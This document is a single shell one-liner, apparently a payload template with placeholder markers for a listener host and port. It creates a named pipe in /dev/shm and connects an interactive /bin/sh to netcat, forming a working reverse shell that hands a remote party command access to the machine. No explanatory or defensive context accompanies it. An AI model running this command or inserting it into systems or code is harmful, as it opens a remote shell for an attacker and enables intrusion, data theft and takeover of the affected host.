rm -f /dev/shm/s && mkfifo /dev/shm/s && cat /dev/shm/s|/bin/sh -i 2>&1|nc §LHOST§ §LPORT§ >/dev/shm/s
